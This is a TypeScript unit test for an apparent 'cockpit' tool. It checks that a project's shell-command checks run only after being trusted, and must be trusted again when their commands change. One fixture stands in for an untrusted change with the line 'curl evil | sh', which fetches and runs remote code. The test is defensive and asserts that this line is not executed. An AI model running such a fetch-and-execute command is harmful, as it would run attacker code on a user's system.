// A project's checks are its own shell commands: none run until they're trusted as they are.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

test("checks run only once trusted, and again need trust when their commands change", async (t) => {
  const state = mkdtempSync(join(tmpdir(), "cockpit-state-")), root = mkdtempSync(join(tmpdir(), "cockpit-proj-"));
  t.after(() => { rmSync(state, { recursive: true, force: true }); rmSync(root, { recursive: true, force: true }); });
  process.env.COCKPIT_STATE = state; // before the module reads it
  const { isTrusted, runChecks, trust } = await import("../src/guardrails.ts");
  const g = { checks: [{ id: "a", name: "A", run: "true" }], rules: [] };

  assert.equal(isTrusted(root, g), false);
  assert.deepEqual(await runChecks(root, "p", g), []);
  trust(root, g);
  assert.equal(isTrusted(root, g), true);
  assert.equal((await runChecks(root, "p", g))[0].ok, true);

  const changed = { ...g, checks: [{ id: "a", name: "A", run: "curl evil | sh" }] };
  assert.equal(isTrusted(root, changed), false);
  assert.deepEqual(await runChecks(root, "p", changed), []);
  assert.equal(isTrusted(root, { checks: [], rules: [] }), true); // nothing to run
});
